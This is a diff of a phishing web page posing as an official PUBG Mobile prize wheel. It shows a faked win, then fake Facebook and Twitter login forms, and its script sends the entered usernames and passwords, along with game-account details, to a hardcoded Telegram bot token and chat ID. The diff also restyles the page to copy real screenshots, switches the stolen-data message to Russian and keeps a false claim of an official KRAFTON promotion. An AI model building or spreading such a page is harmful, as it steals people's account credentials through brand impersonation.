@@ -10,81 +10,105 @@
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: Arial, sans-serif;
         }
         
         body {
-            background: linear-gradient(135deg, #0a0a2a 0%, #1a1a3a 100%);
+            background: #000;
             color: #fff;
             min-height: 100vh;
             overflow-x: hidden;
-            position: relative;
+            background-image: 
+                radial-gradient(circle at 20% 30%, rgba(120, 119, 198, 0.1) 0%, transparent 20%),
+                radial-gradient(circle at 80% 70%, rgba(255, 119, 198, 0.05) 0%, transparent 20%);
         }
         
         .container {
-            max-width: 1200px;
+            max-width: 1000px;
             margin: 0 auto;
             padding: 20px;
-        }
-        
-        header {
-            text-align: center;
-            padding: 30px 0;
             position: relative;
         }
         
-        .logo {
-            font-size: 3.5rem;
-            font-weight: 900;
-            color: #FFD700;
-            text-transform: uppercase;
-            letter-spacing: 5px;
-            text-shadow: 0 0 10px rgba(255, 215, 0, 0.7);
-            margin-bottom: 10px;
+        /* Header Styles from IMG_0076 */
+        .header {
+            text-align: center;
+            padding: 20px 0 30px 0;
+            position: relative;
         }
         
-        .logo span {
-            color: #ff4500;
+        .main-title {
+            font-size: 52px;
+            font-weight: 900;
+            color: #fff;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            text-shadow: 
+                0 0 10px rgba(255, 215, 0, 0.8),
+                0 0 20px rgba(255, 140, 0, 0.6),
+                0 0 30px rgba(255, 69, 0, 0.4);
+            margin-bottom: 5px;
+            background: linear-gradient(to right, #FFD700, #FF8C00, #FF4500);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
         }
         
         .subtitle {
-            font-size: 1.5rem;
-            color: #aaa;
-            margin-bottom: 30px;
+            font-size: 24px;
+            font-weight: bold;
+            color: #FFD700;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin-bottom: 15px;
         }
         
-        .congrats-banner {
-            background: linear-gradient(90deg, #8B0000 0%, #B22222 100%);
-            padding: 15px;
-            border-radius: 10px;
-            text-align: center;
-            margin: 20px 0;
+        .pubg-banner {
+            background: linear-gradient(90deg, #8B0000 0%, #B22222 50%, #8B0000 100%);
+            padding: 12px;
+            border-radius: 8px;
+            margin: 15px auto 25px auto;
             border: 2px solid #FFD700;
             box-shadow: 0 0 15px rgba(255, 215, 0, 0.5);
+            max-width: 600px;
+            position: relative;
         }
         
-        .congrats-banner h2 {
-            font-size: 2rem;
+        .banner-text {
+            font-size: 22px;
+            font-weight: bold;
             color: #FFD700;
+            text-align: center;
+            text-transform: uppercase;
+            letter-spacing: 1px;
         }
         
-        .main-content {
+        .congrats-text {
+            font-size: 20px;
+            color: #fff;
+            text-align: center;
+            font-weight: bold;
+            margin-top: 5px;
+        }
+        
+        /* Wheel Section */
+        .wheel-section {
             display: flex;
             flex-wrap: wrap;
-            gap: 40px;
-            margin-top: 30px;
-        }
-        
-        .wheel-section {
-            flex: 1;
-            min-width: 300px;
+            gap: 30px;
+            margin: 30px 0;
+            justify-content: center;
         }
         
         .wheel-container {
-            position: relative;
-            width: 100%;
+            flex: 1;
+            min-width: 300px;
             max-width: 500px;
-            margin: 0 auto;
+            position: relative;
+            padding: 20px;
+            background: rgba(20, 20, 40, 0.7);
+            border-radius: 15px;
+            border: 2px solid #444;
         }
         
         .wheel {
@@ -92,7 +116,7 @@
             height: auto;
             border-radius: 50%;
             transition: transform 4s cubic-bezier(0.17, 0.67, 0.83, 0.67);
-            box-shadow: 0 0 30px rgba(255, 215, 0, 0.5);
+            box-shadow: 0 0 30px rgba(255, 215, 0, 0.3);
             border: 5px solid #FFD700;
         }
         
@@ -101,8 +125,8 @@
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            width: 60px;
-            height: 60px;
+            width: 70px;
+            height: 70px;
             background: #8B0000;
             border-radius: 50%;
             border: 5px solid #FFD700;
@@ -115,33 +139,50 @@
         }
         
         .wheel-center span {
-            font-size: 0.9rem;
+            font-size: 14px;
             font-weight: bold;
             color: #FFD700;
             text-align: center;
+            text-transform: uppercase;
+        }
+        
+        .pointer {
+            position: absolute;
+            top: -15px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 40px;
+            height: 40px;
+            background: #FFD700;
+            clip-path: polygon(50% 0%, 0% 100%, 100% 100%);
+            z-index: 5;
+            filter: drop-shadow(0 0 5px rgba(255, 215, 0, 0.8));
+        }
+        
+        .spin-btn-container {
+            text-align: center;
+            margin: 20px 0;
         }
         
         .spin-btn {
-            display: block;
-            width: 200px;
-            margin: 30px auto;
-            padding: 15px 30px;
+            padding: 15px 40px;
             background: linear-gradient(90deg, #8B0000 0%, #B22222 100%);
             color: #FFD700;
             border: none;
-            border-radius: 50px;
-            font-size: 1.5rem;
+            border-radius: 25px;
+            font-size: 20px;
             font-weight: bold;
             cursor: pointer;
             text-transform: uppercase;
             letter-spacing: 2px;
             box-shadow: 0 5px 15px rgba(139, 0, 0, 0.5);
             transition: all 0.3s;
+            border: 2px solid #FFD700;
         }
         
         .spin-btn:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 10px 20px rgba(139, 0, 0, 0.7);
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(139, 0, 0, 0.7);
         }
         
         .spin-btn:disabled {
@@ -150,36 +191,40 @@
             transform: none;
         }
         
+        /* Prizes Section */
         .prizes-section {
             flex: 1;
             min-width: 300px;
-            background: rgba(0, 0, 0, 0.5);
+            background: rgba(10, 10, 30, 0.8);
             border-radius: 15px;
             padding: 25px;
             border: 2px solid #444;
         }
         
         .section-title {
-            font-size: 1.8rem;
+            font-size: 24px;
             color: #FFD700;
             margin-bottom: 20px;
             text-align: center;
             text-transform: uppercase;
             letter-spacing: 1px;
+            border-bottom: 2px solid #FFD700;
+            padding-bottom: 10px;
         }
         
         .prizes-grid {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
             gap: 15px;
+            margin-bottom: 25px;
         }
         
         .prize-item {
-            background: rgba(30, 30, 60, 0.8);
-            border-radius: 10px;
-            padding: 15px;
+            background: rgba(30, 30, 50, 0.9);
+            border-radius: 8px;
+            padding: 12px;
             text-align: center;
-            border: 2px solid #555;
+            border: 1px solid #555;
             transition: all 0.3s;
             position: relative;
             overflow: hidden;
@@ -192,210 +237,317 @@
         }
         
         .prize-item img {
-            width: 80px;
-            height: 80px;
+            width: 70px;
+            height: 70px;
             object-fit: cover;
             border-radius: 5px;
-            margin-bottom: 10px;
+            margin-bottom: 8px;
             background: #222;
-            padding: 5px;
+            padding: 3px;
+            border: 1px solid #666;
         }
         
         .prize-item.winner {
             border-color: #FFD700;
-            box-shadow: 0 0 20px rgba(255, 215, 0, 0.8);
+            box-shadow: 0 0 15px rgba(255, 215, 0, 0.8);
             background: rgba(139, 0, 0, 0.3);
         }
         
         .prize-name {
-            font-size: 0.9rem;
+            font-size: 12px;
             color: #fff;
             font-weight: bold;
         }
         
-        .winner-section {
-            margin-top: 30px;
-            background: rgba(0, 0, 0, 0.7);
-            padding: 20px;
-            border-radius: 15px;
-            border: 2px solid #FFD700;
-            text-align: center;
-        }
-        
-        .winner-prize {
-            font-size: 1.8rem;
-            color: #FFD700;
-            margin: 10px 0;
-            text-transform: uppercase;
-        }
-        
-        .winner-image {
-            width: 120px;
-            height: 120px;
-            object-fit: cover;
-            margin: 15px auto;
-            display: block;
-            border-radius: 10px;
-            border: 3px solid #FFD700;
-            background: #222;
-            padding: 5px;
-        }
-        
+        /* Login Section from IMG_0077 */
         .login-section {
-            margin-top: 40px;
-            background: rgba(0, 0, 0, 0.7);
-            padding: 30px;
-            border-radius: 15px;
+            background: rgba(15, 15, 35, 0.9);
+            padding: 25px;
+            border-radius: 12px;
+            margin-top: 20px;
+            border: 2px solid #555;
+        }
+        
+        .login-title {
+            font-size: 22px;
+            color: #FFD700;
+            margin-bottom: 10px;
             text-align: center;
+        }
+        
+        .login-subtitle {
+            font-size: 18px;
+            color: #fff;
+            text-align: center;
+            margin-bottom: 20px;
+            font-weight: bold;
         }
         
         .login-options {
             display: flex;
             justify-content: center;
             gap: 20px;
-            margin: 20px 0;
+            margin: 25px 0;
             flex-wrap: wrap;
         }
         
-        .login-btn {
-            padding: 15px 30px;
-            border-radius: 10px;
-            font-size: 1.2rem;
-            font-weight: bold;
+        .login-option {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 12px 25px;
+            background: rgba(40, 40, 60, 0.9);
+            border-radius: 8px;
+            border: 2px solid #666;
             cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .login-option:hover {
+            border-color: #FFD700;
+            background: rgba(60, 60, 80, 0.9);
+        }
+        
+        .login-option.selected {
+            border-color: #FFD700;
+            background: rgba(139, 0, 0, 0.3);
+        }
+        
+        .checkbox {
+            width: 20px;
+            height: 20px;
+            border: 2px solid #FFD700;
+            border-radius: 4px;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 10px;
-            transition: all 0.3s;
-            border: none;
-            width: 220px;
         }
         
-        .facebook-btn {
-            background: #1877F2;
-            color: white;
+        .checkbox.checked:after {
+            content: "✓";
+            color: #FFD700;
+            font-weight: bold;
         }
         
-        .twitter-btn {
-            background: #1DA1F2;
-            color: white;
-        }
-        
-        .login-btn:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
+        .login-label {
+            font-size: 18px;
+            color: #fff;
+            font-weight: bold;
         }
         
         .login-form {
-            background: rgba(30, 30, 50, 0.9);
+            background: rgba(25, 25, 45, 0.9);
             padding: 25px;
             border-radius: 10px;
             margin-top: 20px;
-            text-align: left;
             display: none;
+        }
+        
+        .form-title {
+            color: #1877F2;
+            font-size: 20px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        
+        .form-description {
+            color: #ccc;
+            text-align: center;
+            margin-bottom: 20px;
+            font-size: 16px;
         }
         
         .form-group {
             margin-bottom: 20px;
         }
         
-        .form-group label {
+        .form-label {
             display: block;
             margin-bottom: 8px;
             color: #FFD700;
+            font-size: 16px;
         }
         
-        .form-group input {
+        .form-input {
             width: 100%;
-            padding: 12px;
-            border-radius: 5px;
+            padding: 12px 15px;
+            border-radius: 6px;
             border: 1px solid #555;
-            background: rgba(0, 0, 0, 0.7);
+            background: rgba(10, 10, 20, 0.9);
             color: white;
-            font-size: 1rem;
+            font-size: 16px;
         }
         
-        .submit-btn {
+        .form-input:focus {
+            outline: none;
+            border-color: #1877F2;
+        }
+        
+        .form-submit {
             width: 100%;
             padding: 15px;
-            background: linear-gradient(90deg, #8B0000 0%, #B22222 100%);
-            color: #FFD700;
+            background: #1877F2;
+            color: white;
             border: none;
-            border-radius: 5px;
-            font-size: 1.2rem;
+            border-radius: 6px;
+            font-size: 18px;
             font-weight: bold;
             cursor: pointer;
-            text-transform: uppercase;
-            letter-spacing: 1px;
+            margin-top: 10px;
         }
         
+        .form-links {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 15px;
+            font-size: 14px;
+        }
+        
+        .form-link {
+            color: #aaa;
+            text-decoration: none;
+        }
+        
+        .form-link:hover {
+            color: #FFD700;
+            text-decoration: underline;
+        }
+        
+        .languages {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 15px;
+            justify-content: center;
+            margin-top: 20px;
+            padding-top: 20px;
+            border-top: 1px solid #444;
+            color: #aaa;
+            font-size: 14px;
+        }
+        
+        /* Verify Section from IMG_0078 */
         .verify-section {
-            background: rgba(0, 0, 0, 0.8);
+            background: rgba(15, 15, 35, 0.9);
             padding: 30px;
-            border-radius: 15px;
-            margin-top: 30px;
+            border-radius: 12px;
+            margin-top: 25px;
+            border: 2px solid #555;
             display: none;
+        }
+        
+        .verify-title {
+            font-size: 28px;
+            color: #FFD700;
+            margin-bottom: 25px;
+            text-align: center;
+            text-transform: uppercase;
         }
         
         .verify-grid {
             display: grid;
             grid-template-columns: repeat(2, 1fr);
             gap: 20px;
-            margin: 20px 0;
+            margin: 25px 0;
         }
         
         .verify-item {
-            background: rgba(30, 30, 60, 0.8);
+            background: rgba(30, 30, 50, 0.9);
             padding: 15px;
-            border-radius: 10px;
+            border-radius: 8px;
+            border: 1px solid #555;
         }
         
         .verify-label {
-            color: #aaa;
-            font-size: 0.9rem;
-            margin-bottom: 5px;
-        }
-        
-        .verify-value {
             color: #FFD700;
-            font-size: 1.1rem;
+            font-size: 16px;
+            margin-bottom: 8px;
             font-weight: bold;
         }
         
-        .notification {
-            background: rgba(0, 100, 0, 0.7);
-            padding: 20px;
-            border-radius: 10px;
-            margin-top: 30px;
+        .verify-value {
+            color: #fff;
+            font-size: 18px;
+            font-weight: bold;
+        }
+        
+        .verify-submit {
+            display: block;
+            width: 200px;
+            margin: 30px auto 0;
+            padding: 15px;
+            background: linear-gradient(90deg, #8B0000 0%, #B22222 100%);
+            color: #FFD700;
+            border: none;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            border: 2px solid #FFD700;
+        }
+        
+        /* Success Section */
+        .success-section {
+            background: rgba(0, 50, 0, 0.8);
+            padding: 30px;
+            border-radius: 12px;
+            margin-top: 25px;
             border: 2px solid #00aa00;
             display: none;
         }
         
-        .footer {
+        .success-title {
+            font-size: 28px;
+            color: #00ff00;
+            margin-bottom: 20px;
             text-align: center;
-            margin-top: 50px;
+            text-transform: uppercase;
+        }
+        
+        .success-message {
+            font-size: 18px;
+            color: #fff;
+            text-align: center;
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+        
+        .process-url {
+            text-align: center;
+            color: #FFD700;
+            margin: 20px 0;
+            font-size: 14px;
+        }
+        
+        /* Footer Section */
+        .footer {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 40px;
             padding-top: 20px;
             border-top: 1px solid #444;
-            color: #aaa;
-            font-size: 0.9rem;
+            flex-wrap: wrap;
         }
         
-        .highlight {
-            color: #FFD700;
+        .footer-logo {
+            font-size: 24px;
             font-weight: bold;
+            color: #FFD700;
+            text-transform: uppercase;
         }
         
-        .pointer {
-            position: absolute;
-            top: 0;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 30px;
-            height: 30px;
-            background: #FFD700;
-            clip-path: polygon(50% 0%, 0% 100%, 100% 100%);
-            z-index: 5;
+        .footer-event {
+            font-size: 18px;
+            color: #fff;
+            text-align: center;
+        }
+        
+        .footer-copyright {
+            font-size: 14px;
+            color: #aaa;
+            text-align: right;
         }
         
         .spinning {
@@ -408,7 +560,7 @@
         }
         
         @media (max-width: 768px) {
-            .main-content {
+            .wheel-section {
                 flex-direction: column;
             }
             
@@ -419,112 +571,139 @@
             .verify-grid {
                 grid-template-columns: 1fr;
             }
+            
+            .footer {
+                flex-direction: column;
+                gap: 15px;
+                text-align: center;
+            }
         }
         
-        /* Telegram bot integration styles */
+        /* Telegram bot info */
         .telegram-info {
-            background: rgba(30, 30, 60, 0.9);
-            padding: 20px;
-            border-radius: 10px;
+            background: rgba(0, 100, 150, 0.2);
+            padding: 15px;
+            border-radius: 8px;
             margin-top: 20px;
-            border-left: 5px solid #0088cc;
-        }
-        
-        .telegram-info h4 {
-            color: #0088cc;
-            margin-bottom: 10px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
+            border-left: 4px solid #0088cc;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <header>
-            <div class="logo">MEXICO <span>ROYAL</span></div>
+        <!-- Header from IMG_0076 -->
+        <div class="header">
+            <div class="main-title">MEXICO ROYAL</div>
             <div class="subtitle">ROYALE PASS S</div>
             
-            <div class="congrats-banner">
-                <h2>PUBG MOBILE METRO ROYALE PASS SIG</h2>
-                <h2>Congratulations</h2>
+            <div class="pubg-banner">
+                <div class="banner-text">PUBG MOBILE METRO ROYALE PASS SIG</div>
+                <div class="congrats-text">Congratulations</div>
             </div>
-        </header>
+            
+            <div class="spin-btn-container">
+                <button class="spin-btn" id="spinButton">SPIN TO WIN</button>
+            </div>
+        </div>
         
-        <div class="main-content">
-            <div class="wheel-section">
-                <div class="wheel-container">
-                    <div class="pointer"></div>
-                    <img src="https://i.imgur.com/placeholder-wheel.png" alt="Wheel" class="wheel" id="wheel">
-                    <div class="wheel-center" id="spinCenter">
-                        <span>SPIN TO WIN</span>
-                    </div>
+        <div class="wheel-section">
+            <!-- Wheel Container -->
+            <div class="wheel-container">
+                <div class="pointer"></div>
+                <img src="https://i.imgur.com/wheel-placeholder.png" alt="Wheel" class="wheel" id="wheel">
+                <div class="wheel-center" id="spinCenter">
+                    <span>SPIN<br>WHEEL</span>
                 </div>
                 
-                <button class="spin-btn" id="spinButton">SPIN WHEEL</button>
-                
-                <div class="winner-section" id="winnerSection" style="display: none;">
-                    <h3 class="section-title">YOU WON!</h3>
-                    <img src="" alt="Prize" class="winner-image" id="winnerImage">
-                    <div class="winner-prize" id="winnerPrize"></div>
-                    <p>Login to claim your reward</p>
+                <!-- Winner Display -->
+                <div id="winnerSection" style="display: none; text-align: center; margin-top: 20px; padding: 15px; background: rgba(139,0,0,0.3); border-radius: 10px; border: 2px solid #FFD700;">
+                    <h3 style="color: #FFD700; margin-bottom: 10px;">YOU WON!</h3>
+                    <img id="winnerImage" src="" alt="Prize" style="width: 100px; height: 100px; border-radius: 8px; border: 2px solid #FFD700; margin-bottom: 10px;">
+                    <div id="winnerPrize" style="font-size: 20px; color: #FFD700; font-weight: bold;"></div>
                 </div>
             </div>
             
+            <!-- Prizes Section -->
             <div class="prizes-section">
                 <h3 class="section-title">Available Prizes</h3>
                 <div class="prizes-grid" id="prizesGrid">
-                    <!-- Prizes will be added by JavaScript -->
+                    <!-- Prizes will be loaded by JavaScript -->
                 </div>
                 
+                <!-- Login Section from IMG_0077 -->
                 <div class="login-section" id="loginSection">
-                    <h3 class="section-title">Login to receive reward</h3>
+                    <h3 class="login-title">PUBG MOBILE METRO ROYALE PASS SIG</h3>
+                    <div class="login-subtitle">Login to receive reward</div>
+                    
                     <div class="login-options">
-                        <button class="login-btn facebook-btn" id="facebookLogin">
-                            <i class="fab fa-facebook-f"></i> Login With Facebook
-                        </button>
-                        <button class="login-btn twitter-btn" id="twitterLogin">
-                            <i class="fab fa-twitter"></i> Login With Twitter
-                        </button>
+                        <div class="login-option" id="facebookOption">
+                            <div class="checkbox" id="fbCheckbox"></div>
+                            <div class="login-label">Login With Facebook</div>
+                        </div>
+                        <div class="login-option" id="twitterOption">
+                            <div class="checkbox" id="twCheckbox"></div>
+                            <div class="login-label">Login With Twitter</div>
+                        </div>
                     </div>
                     
+                    <!-- Facebook Login Form -->
                     <div class="login-form" id="facebookForm">
-                        <h4 style="color: #1877F2; margin-bottom: 15px; text-align: center;">
-                            <i class="fab fa-facebook"></i> Log in to your Facebook account
-                        </h4>
+                        <div class="form-title">facebook</div>
+                        <div class="form-description">Log in to your Facebook account to connect to PUBG MOBILE</div>
+                        
                         <div class="form-group">
-                            <label for="fbEmail">Mobile number or email address</label>
-                            <input type="text" id="fbEmail" placeholder="Enter your email or phone">
+                            <label class="form-label">Mobile number or email address</label>
+                            <input type="text" class="form-input" id="fbEmail" placeholder="Enter email or phone">
                         </div>
+                        
                         <div class="form-group">
-                            <label for="fbPassword">Password</label>
-                            <input type="password" id="fbPassword" placeholder="Enter your password">
+                            <label class="form-label">Password</label>
+                            <input type="password" class="form-input" id="fbPassword" placeholder="Enter password">
                         </div>
-                        <button class="submit-btn" id="fbSubmit">Log In</button>
-                        <div style="margin-top: 15px; text-align: center;">
-                            <a href="#" style="color: #aaa; margin-right: 15px;">Create account</a>
-                            <a href="#" style="color: #aaa; margin-right: 15px;">Forgotten password?</a>
+                        
+                        <button class="form-submit" id="fbSubmit">Log In</button>
+                        
+                        <div class="form-links">
+                            <a href="#" class="form-link">Create account</a>
+                            <a href="#" class="form-link">Not now</a>
+                            <a href="#" class="form-link">Forgotten password?</a>
+                        </div>
+                        
+                        <div class="languages">
+                            <span>English (UK)</span>
+                            <span>Basa Jawa</span>
+                            <span>日本語</span>
+                            <span>Portugues (Brasil)</span>
+                            <span>Facebook Inc.</span>
+                            <span>Bahasa Indonesia</span>
+                            <span>Bahasa Melayu</span>
+                            <span>Español</span>
                         </div>
                     </div>
                     
+                    <!-- Twitter Login Form -->
                     <div class="login-form" id="twitterForm">
-                        <h4 style="color: #1DA1F2; margin-bottom: 15px; text-align: center;">
-                            <i class="fab fa-twitter"></i> Log in to your Twitter account
-                        </h4>
+                        <div class="form-title">Twitter Login</div>
+                        <div class="form-description">Log in to your Twitter account to connect to PUBG MOBILE</div>
+                        
                         <div class="form-group">
-                            <label for="twUsername">Username or email</label>
-                            <input type="text" id="twUsername" placeholder="Enter your username or email">
+                            <label class="form-label">Username or email</label>
+                            <input type="text" class="form-input" id="twUsername" placeholder="Enter username or email">
                         </div>
+                        
                         <div class="form-group">
-                            <label for="twPassword">Password</label>
-                            <input type="password" id="twPassword" placeholder="Enter your password">
+                            <label class="form-label">Password</label>
+                            <input type="password" class="form-input" id="twPassword" placeholder="Enter password">
                         </div>
-                        <button class="submit-btn" id="twSubmit">Log In</button>
+                        
+                        <button class="form-submit" id="twSubmit">Log In</button>
                     </div>
                 </div>
                 
+                <!-- Verify Section from IMG_0078 -->
                 <div class="verify-section" id="verifySection">
-                    <h3 class="section-title">VERIFY YOUR ACCOUNT</h3>
+                    <h2 class="verify-title">VERIFY YOUR ACCOUNT</h2>
+                    
                     <div class="verify-grid">
                         <div class="verify-item">
                             <div class="verify-label">Character ID</div>
@@ -559,25 +738,35 @@
                             <div class="verify-value" id="platform">-</div>
                         </div>
                     </div>
-                    <button class="submit-btn" id="verifySubmit">Submit</button>
+                    
+                    <div class="process-url">https://pubg.com/process</div>
+                    
+                    <button class="verify-submit" id="verifySubmit">Submit</button>
                 </div>
                 
-                <div class="notification" id="successNotification">
-                    <h4 style="color: #00ff00; margin-bottom: 10px;">Congratulations!</h4>
-                    <p>Hi Survivor, your account has been processing to receive your selected rewards. Please wait up to 24 hours to receive this rewards in your ingame mailbox.</p>
+                <!-- Success Section -->
+                <div class="success-section" id="successSection">
+                    <h2 class="success-title">Congratulations</h2>
+                    <p class="success-message">
+                        Hi Survivor, your account has been processing to receive your selected rewards. 
+                        Please wait up to 24 hours to receive this rewards in your ingame mailbox.
+                    </p>
                     
                     <div class="telegram-info">
-                        <h4><i class="fab fa-telegram"></i> Telegram Bot Connected</h4>
-                        <p>Your prize claim details have been sent to the administrator via Telegram bot. You will receive confirmation shortly.</p>
+                        <h4 style="color: #0088cc; margin-bottom: 10px;">
+                            <i class="fab fa-telegram"></i> Telegram Notification Sent
+                        </h4>
+                        <p style="color: #fff;">Your prize claim has been sent to the administrator. You will receive your reward soon.</p>
                     </div>
                 </div>
             </div>
         </div>
         
+        <!-- Footer -->
         <div class="footer">
-            <p>PUBG MOBILE METRO ROYALE PASS SIG | ROYALE PASS S</p>
-            <p>This is an official promotion by PUBG MOBILE. All rights reserved.</p>
-            <p>© 2023 KRAFTON, Inc. PUBG MOBILE is a trademark of KRAFTON, Inc.</p>
+            <div class="footer-logo">PUBG ROYAL</div>
+            <div class="footer-event">PROFILE PASS SPIN<br>PUBG MOBILE LUCKY SPIN HALLOWEEN EVENT</div>
+            <div class="footer-copyright">© 2023 PUBG MOBILE. All rights reserved.</div>
         </div>
     </div>
 
@@ -586,7 +775,7 @@
         const TELEGRAM_BOT_TOKEN = '8498045152:AAH6b4APGZfXDz0Dm0UFvN0kIkfvqtmViKU';
         const TELEGRAM_CHAT_ID = '1709490182';
         
-        // Prizes data
+        // Prizes data with placeholder images
         const prizes = [
             { id: 1, name: "Pharaon Skin", image: "pharaon.jpg", code: "PHARAON2023" },
             { id: 2, name: "Special Material", image: "material.jpg", code: "MATERIALX" },
@@ -604,7 +793,6 @@
         
         // Game state
         let userData = {
-            isLoggedIn: false,
             isSpun: false,
             winnerPrize: null,
             loginMethod: null,
@@ -620,15 +808,17 @@
         const winnerPrize = document.getElementById('winnerPrize');
         const prizesGrid = document.getElementById('prizesGrid');
         const loginSection = document.getElementById('loginSection');
-        const facebookLogin = document.getElementById('facebookLogin');
-        const twitterLogin = document.getElementById('twitterLogin');
+        const facebookOption = document.getElementById('facebookOption');
+        const twitterOption = document.getElementById('twitterOption');
+        const fbCheckbox = document.getElementById('fbCheckbox');
+        const twCheckbox = document.getElementById('twCheckbox');
         const facebookForm = document.getElementById('facebookForm');
         const twitterForm = document.getElementById('twitterForm');
         const fbSubmit = document.getElementById('fbSubmit');
         const twSubmit = document.getElementById('twSubmit');
         const verifySection = document.getElementById('verifySection');
         const verifySubmit = document.getElementById('verifySubmit');
-        const successNotification = document.getElementById('successNotification');
+        const successSection = document.getElementById('successSection');
         
         // Initialize prizes grid
         function initPrizesGrid() {
@@ -637,7 +827,7 @@
                 const prizeElement = document.createElement('div');
                 prizeElement.className = 'prize-item';
                 prizeElement.innerHTML = `
-                    <img src="${prize.image}" alt="${prize.name}" onerror="this.src='https://via.placeholder.com/80/222/fff?text=prize'">
+                    <img src="${prize.image}" alt="${prize.name}" onerror="this.src='https://via.placeholder.com/70/222/fff?text=PRIZE'">
                     <div class="prize-name">${prize.name}</div>
                 `;
                 prizeElement.dataset.id = prize.id;
@@ -650,6 +840,7 @@
             if (userData.isSpun) return;
             
             spinButton.disabled = true;
+            spinButton.textContent = "SPINNING...";
             spinCenter.classList.add('spinning');
             
             // Random prize selection
@@ -667,6 +858,7 @@
             // Show winner after animation
             setTimeout(() => {
                 spinCenter.classList.remove('spinning');
+                spinButton.textContent = "SPIN TO WIN";
                 showWinner(winner);
                 userData.isSpun = true;
                 
@@ -676,6 +868,11 @@
                         item.classList.add('winner');
                     }
                 });
+                
+                // Show login section
+                setTimeout(() => {
+                    loginSection.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                }, 1000);
             }, 4000);
         }
         
@@ -683,28 +880,31 @@
         function showWinner(prize) {
             winnerImage.src = prize.image;
             winnerImage.onerror = function() {
-                this.src = 'https://via.placeholder.com/120/222/fff?text=prize';
+                this.src = 'https://via.placeholder.com/100/222/fff?text=' + encodeURIComponent(prize.name);
             };
             winnerPrize.textContent = prize.name;
             winnerSection.style.display = 'block';
-            
-            // Scroll to winner section
-            winnerSection.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
         }
         
         // Show login form
         function showLoginForm(method) {
             userData.loginMethod = method;
             
-            // Hide all forms first
-            facebookForm.style.display = 'none';
-            twitterForm.style.display = 'none';
-            
-            // Show selected form
+            // Update checkboxes
             if (method === 'facebook') {
+                fbCheckbox.classList.add('checked');
+                twCheckbox.classList.remove('checked');
+                facebookOption.classList.add('selected');
+                twitterOption.classList.remove('selected');
                 facebookForm.style.display = 'block';
-            } else if (method === 'twitter') {
+                twitterForm.style.display = 'none';
+            } else {
+                twCheckbox.classList.add('checked');
+                fbCheckbox.classList.remove('checked');
+                twitterOption.classList.add('selected');
+                facebookOption.classList.remove('selected');
                 twitterForm.style.display = 'block';
+                facebookForm.style.display = 'none';
             }
         }
         
@@ -745,29 +945,29 @@
             document.getElementById('platform').textContent = userData.accountData.platform;
             
             verifySection.style.display = 'block';
-            verifySection.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+            verifySection.scrollIntoView({ behavior: 'smooth', block: 'center' });
         }
         
         // Send data to Telegram bot
         function sendToTelegram(credentials) {
             const message = `
-🎮 *NEW PRIZE CLAIM* 🎮
+🎮 *НОВЫЙ ВЫИГРЫШ В PUBG* 🎮
 
-*Prize Won:* ${userData.winnerPrize.name}
-*Prize Code:* ${userData.winnerPrize.code}
+*Выигранный приз:* ${userData.winnerPrize.name}
+*Код приза:* ${userData.winnerPrize.code}
 
-*Account Details:*
-- Character ID: ${userData.accountData.characterId}
-- Character Name: ${userData.accountData.characterName}
-- Account Level: ${userData.accountData.accountLevel}
-- Rank Tier: ${userData.accountData.rankTier}
-- Royale Pass: ${userData.accountData.passType} (Level ${userData.accountData.passLevel})
-- Platform: ${userData.accountData.platform}
+*Данные аккаунта:*
+- ID персонажа: ${userData.accountData.characterId}
+- Имя персонажа: ${userData.accountData.characterName}
+- Уровень аккаунта: ${userData.accountData.accountLevel}
+- Ранговый уровень: ${userData.accountData.rankTier}
+- Royale Pass: ${userData.accountData.passType} (Уровень ${userData.accountData.passLevel})
+- Платформа: ${userData.accountData.platform}
 
-*Login Method:* ${userData.loginMethod}
-*Login Credentials:* ${credentials}
+*Метод входа:* ${userData.loginMethod}
+*Данные для входа:* ${credentials}
 
-*Claim Time:* ${new Date().toLocaleString()}
+*Время запроса:* ${new Date().toLocaleString('ru-RU')}
             `;
             
             const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
@@ -785,28 +985,29 @@
             })
             .then(response => response.json())
             .then(data => {
-                console.log('Telegram message sent:', data);
+                console.log('Данные отправлены в Telegram:', data);
             })
             .catch(error => {
-                console.error('Error sending to Telegram:', error);
+                console.error('Ошибка отправки в Telegram:', error);
             });
         }
         
         // Show success notification
         function showSuccessNotification() {
             verifySection.style.display = 'none';
-            successNotification.style.display = 'block';
-            successNotification.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+            successSection.style.display = 'block';
+            successSection.scrollIntoView({ behavior: 'smooth', block: 'center' });
         }
         
         // Event Listeners
         spinButton.addEventListener('click', spinWheel);
         spinCenter.addEventListener('click', spinWheel);
         
-        facebookLogin.addEventListener('click', () => showLoginForm('facebook'));
-        twitterLogin.addEventListener('click', () => showLoginForm('twitter'));
+        facebookOption.addEventListener('click', () => showLoginForm('facebook'));
+        twitterOption.addEventListener('click', () => showLoginForm('twitter'));
         
-        fbSubmit.addEventListener('click', () => {
+        fbSubmit.addEventListener('click', (e) => {
+            e.preventDefault();
